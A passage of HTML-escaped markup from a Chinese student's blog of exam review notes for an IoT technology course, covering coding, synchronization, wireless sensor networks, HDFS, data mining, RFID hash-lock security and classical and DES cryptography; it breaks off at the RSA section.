	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023645-1185344687_hu9160041075302415823.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023645-1185344687_hu18313169121587396386.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151232873&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;529px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6p151线性分组码的实现和相关概念监督矩阵生成矩阵&#34;&gt;6.[P151]线性分组码的实现和相关概念（监督矩阵、生成矩阵）。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;k个信息位，r个监督位&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023900-1256138204.png&#34;
	width=&#34;347&#34;
	height=&#34;132&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023900-1256138204_hu265973280428375602.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023900-1256138204_hu6045252713228032114.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151237158&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;262&#34;
		data-flex-basis=&#34;630px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;监督矩阵和生成矩阵都是海明码，书上是（7，4）海明码，应该就考74乐&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;监督矩阵Q：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024340-171353850.png&#34;
	width=&#34;901&#34;
	height=&#34;182&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024340-171353850_hu8406175312659728040.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024340-171353850_hu16580522587967378861.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151242584&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;495&#34;
		data-flex-basis=&#34;1188px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;生成矩阵G：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024630-1210909689.png&#34;
	width=&#34;897&#34;
	height=&#34;206&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024630-1210909689_hu1114014748501495937.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024630-1210909689_hu7772482271478140426.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151245842&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;435&#34;
		data-flex-basis=&#34;1045px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;7百度同步的概念和不同层次载波同步帧同步位同步&#34;&gt;7.[百度]同步的概念和不同层次（载波同步、帧同步、位同步）。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024883-212896489.png&#34;
	width=&#34;913&#34;
	height=&#34;187&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024883-212896489_hu14864698738800951929.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024883-212896489_hu2009475465557210541.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151253969&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;488&#34;
		data-flex-basis=&#34;1171px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;8p157多址接入技术的基本概念和意义&#34;&gt;8.[P157]多址接入技术的基本概念和意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基本概念：通信系统通过信道来区分通信对象。一个用户一个信道，多个用户同时通话就是以不同信道加以区分。让众多的用户公用公共信道的一种技术。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常见的应用方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;频分多址：传输信号的载波频率不同来区分信道。&lt;/li&gt;
&lt;li&gt;时分多址：传输信号存在时间不同来区分信道。&lt;/li&gt;
&lt;li&gt;码分多址：传输信号的码型不同来区分信道。&lt;/li&gt;
&lt;li&gt;空分多址：通过空间的分割来区分信道。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;9-无线传感器网络中基于调度的-mac-层p206-trama-协议p208常见的路由协议对比互联网中路由协议p212拓扑控制方法&#34;&gt;9. 无线传感器网络中基于调度的 MAC 层[P206] TRAMA 协议、[P208]常见的路由协议（对比互联网中路由协议）、[P212]拓扑控制方法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基于调度的MAC协议的基本思想：采用某种调度算法将时隙/信道/正交码字节分配给节点，让节点在给定的时隙/信道/正交码字内无冲突访问信道。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TRAMA:包括邻居协议、调度交换协议、自适应时槽选择算法。将时间划分为交替性的随机访问周期和调度访问周期，周期长度不定。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常见路由协议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以数据为中心的路由协议：定向扩散协议、SPIN协议&lt;/li&gt;
&lt;li&gt;基于地理位置的路由协议：地理自适应保真路由协议、能量感知路由协议&lt;/li&gt;
&lt;li&gt;提供数据流和服务质量保障的路由协议：有序分配路由策略、SPEED协议。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;拓扑控制：功率控制和层次性拓扑控制&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第五章&#34;&gt;第五章
&lt;/h1&gt;&lt;h2 id=&#34;1p240-在基于-hdfs-的分布式文件存储系统中文件的读取和写入过程&#34;&gt;1.[P240] 在基于 HDFS 的分布式文件存储系统中，文件的读取和写入过程。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;文件的读取：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端获取HDFS文件系统DistributedFileSystem实例，调用open()方法。&lt;/li&gt;
&lt;li&gt;DistributeFileSystem通过RPC远程调用名称节点，确定文件组成单元块的位置信息。
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;名称节点返回每个单元块及其副本的数据节点地址，这些数据节点按照相对于客户机的距离排序。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DistributedFileSystem向客户端返回FSDataInputStream，而FSDataInputStream封装了管理名称节点和数据节点I/O的DFSInpouStream。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;客户端调用FSDataInputStream的read()方法。&lt;/li&gt;
&lt;li&gt;FSDataInputStream中的DFSInputStream保存前几个单元块的数据节点地址信息，然后连接存储着文件单元块的最近数据节点，重复调用read()方法读取数据，返回客户端。&lt;/li&gt;
&lt;li&gt;第一个单元块读完，DFSInputStream关闭与该节点的连接，然后寻找下一个单元块。&lt;/li&gt;
&lt;li&gt;最后，客户端调用FSDataInputStream的close()方法结束文件读取操作。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025156-707738920.png&#34;
	width=&#34;739&#34;
	height=&#34;483&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025156-707738920_hu10206280308964865356.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025156-707738920_hu16750718301445181543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151301370&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;153&#34;
		data-flex-basis=&#34;367px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件的写入：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端调用DistributedFileSystem中的create()方法创建文件。&lt;/li&gt;
&lt;li&gt;DistributedFileSystem通过RPC调用名称节点，创建新文件并分配单元块。
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;名称节点检查该文件之前不存在，并且客户端有权限创建文件，然后生成新文件记录，否则抛出异常。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DistributedFileSystem向客户端返回FSDataOutStream开始写数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;客户端写入数据，DFSOutputStream将数据分包写入数据队列，同时询问名称节点、选择合适数据节点、分配新单元块。数据节点列表组成管道。&lt;/li&gt;
&lt;li&gt;FSDataOutputStream向管道第一个数据节点传送数据，写完后依次向下继续。&lt;/li&gt;
&lt;li&gt;DFSOutputStream等待所有数据节点写入。&lt;/li&gt;
&lt;li&gt;DistributedFileSystem通知名称节点写文件结束。&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025434-1615494003.png&#34;
	width=&#34;793&#34;
	height=&#34;468&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025434-1615494003_hu5863498079020972319.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025434-1615494003_hu12050050480245342354.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151306288&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;169&#34;
		data-flex-basis=&#34;406px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-云计算和海计算出现的背景和意义&#34;&gt;2. 云计算和海计算出现的背景和意义。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025678-1716981450.png&#34;
	width=&#34;913&#34;
	height=&#34;147&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025678-1716981450_hu9208860809530239136.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025678-1716981450_hu4244404640911949344.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151312591&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;621&#34;
		data-flex-basis=&#34;1490px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;人话翻译：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;云计算就是在互联网上有一群服务器能给你提供计算服务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;云计算能解决大规模数据处理问题，自己还不用买服务器，因此被业界认为是支撑物联网后端的最佳选择。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;海计算就是一片海，海里每一滴水就是现实生活一个东西，这些东西能相互合作感知互动。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;海计算物理物体融入计算，每个个体可以单独计算还能协同组织。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-p268预处理的常见类型和目的意义&#34;&gt;3. [P268]预处理的常见类型和目的/意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;预处理技术很多，常见的有：数据清洗、数据集成、数据转换、数据归约。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;预处理目的是提高数据挖掘的对象的质量。（这个东西就相当于过筛，好数据筛下去了，坏数据留下被处理掉）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;他的意义：帮助改善数据质量，提高数据挖掘进程的有效性和准确性，是整个数据处理的重要部分。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4-p270分类的概念和常见的分类算法决策树最近邻分类-knn-和人工神经网络-ann&#34;&gt;4. [P270]分类的概念和常见的分类算法（决策树、最近邻分类 KNN 和人工神经网络 ANN）。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;分类的概念：将对象指定给预先定义的多种类型中的一种。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;决策树：用于分类的一种树结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;组成：
&lt;ul&gt;
&lt;li&gt;叶子节点：某个类或者类的分布。&lt;/li&gt;
&lt;li&gt;其他节点：对某个属性的一次判定。&lt;/li&gt;
&lt;li&gt;边：代表一个测试结果&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;决策树有【分类树】和【回归树】两种。决策树的结果是二叉树或多叉树。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最近邻分类KNN：一个样本在特征空间里寻找K个和他最像的样本，进入数量多的那一方的类别。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;缺点：样本不平衡的时候，新进去的样本会出现偏差。&lt;/li&gt;
&lt;li&gt;解决方案：加权值。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;人工神经网络ANN：我说不清，大概就是一种运算模型，有大量的节点，每个节点是一种输出函数，两个节点之间是加权值。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025961-2089866687.png&#34;
	width=&#34;307&#34;
	height=&#34;217&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025961-2089866687_hu16856053043016111693.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152025961-2089866687_hu15554418572058596851.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151317989&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;141&#34;
		data-flex-basis=&#34;339px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-p275关联分析的概念和基于-apriori-的算法&#34;&gt;5. [P275]关联分析的概念和基于 Apriori 的算法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;关联分析是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果关系。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apriori算法：详见【P276】&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6-p278聚类分析的概念和基于分层聚类和-k-means-的算法&#34;&gt;6. [P278]聚类分析的概念和基于分层聚类和 K-means 的算法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;聚类分析：将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分层聚类：分为【凝聚】和【分裂】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【凝聚】：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AGNES:两个簇里面的对象之间距离最小，两个簇会被合并。
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026176-1503102166.png&#34;
	width=&#34;440&#34;
	height=&#34;163&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026176-1503102166_hu10715406031319327616.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026176-1503102166_hu15132028388949737120.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151323879&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;269&#34;
		data-flex-basis=&#34;647px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ROCK：没看懂：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026501-265367764.png&#34;
	width=&#34;853&#34;
	height=&#34;208&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026501-265367764_hu381749004241364477.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026501-265367764_hu15310671210584313442.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151329373&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;410&#34;
		data-flex-basis=&#34;984px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【分裂】：DIANA&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有对象成为一个簇，按照某个原则分类指导数量满足要求。
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026775-1502665293.png&#34;
	width=&#34;505&#34;
	height=&#34;204&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026775-1502665293_hu6630302255316535068.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152026775-1502665293_hu6404513022060817522.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151334613&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;247&#34;
		data-flex-basis=&#34;594px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;K-means:看图说话&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027039-1395751395.png&#34;
	width=&#34;883&#34;
	height=&#34;738&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027039-1395751395_hu4437842531092793585.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027039-1395751395_hu960157376237664076.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151343856&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;287px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第六章&#34;&gt;第六章
&lt;/h1&gt;&lt;h2 id=&#34;1-p299感知层安全中常见的物理安全机制和p301基于散列锁定的逻辑安全机制&#34;&gt;1. [P299]感知层安全中常见的物理安全机制和[P301]基于散列锁定的逻辑安全机制。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;物理安全机制（标签）:kill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;散列锁定：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;给电子标签加锁。锁住的时候标签拒绝电子编码，只有发送给他正确的密钥才能解锁。&lt;/li&gt;
&lt;li&gt;锁定过程：
&lt;ul&gt;
&lt;li&gt;阅读器有一个hash函数，他生成一个key，然后计算metaID=hash(key)，然后阅读器把metaID写入标签。&lt;/li&gt;
&lt;li&gt;标签进入锁定状态&lt;/li&gt;
&lt;li&gt;阅读器将（metaID，key）存到后台数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;解锁过程：
&lt;ul&gt;
&lt;li&gt;读写器检测到标签进入范围之后，向标签发出查询信息，标签返回metaID给读写器&lt;/li&gt;
&lt;li&gt;读写器用metaID为索引在后台数据库找key，发给标签&lt;/li&gt;
&lt;li&gt;标签计算hash(key),得到的值和自己的metaID比较，相等就解锁，并发送真实ID给读写器。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2-p314经典密码学中基于变换和置换的加密方法&#34;&gt;2. [P314]经典密码学中基于变换和置换的加密方法。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;变换：换换位置，统计概率就破解了&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;置换：凯撒加密这类的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-p316现代密码学中基于流密码des-算法私钥密码体制和-rsa-算法公钥密码体制的基本原理&#34;&gt;3. [P316]现代密码学中基于流密码、DES 算法（私钥密码体制）和 RSA 算法（公钥密码体制）的基本原理。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;流密码：明文密文连续加密解密，像水流一样。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DES：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027345-431970818.png&#34;
	width=&#34;883&#34;
	height=&#34;98&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027345-431970818_hu15823902976776370470.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152027345-431970818_hu6458231407266851457.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151354257&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;901&#34;
		data-flex-basis=&#34;2162px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;DES对64位明文分组M分为左半部分和右半部分，都是32位长。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用函数f对两部分进行16轮完全相同的迭代运算。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;16轮运算完毕后，将左右两部分合在一起经过一个逆置换产生密文。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RSA：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
